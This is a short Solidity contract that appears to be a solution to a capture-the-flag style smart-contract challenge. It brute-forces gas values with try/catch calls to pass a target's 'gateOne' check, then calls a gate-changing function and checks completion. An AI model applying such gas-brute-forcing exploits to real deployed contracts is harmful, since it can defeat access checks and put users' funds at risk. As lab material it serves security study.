//SPDX-License-Identifier: Unlicense

pragma solidity >=0.6.12;

contract ANS7 {
    constructor(address cg) public {
        for (uint256 i = 0; i < 1234; i++) {
            try I(cg).gateOne{gas: 1000000 + i}() {
                break;
            } catch {}
        }
        I(cg).callFunction("chageGateTwoState()");
        require(I(cg).complete());
    }
}

interface I {
    function gateOne() external;

    function callFunction(bytes memory) external;

    function complete() external returns (bool);
}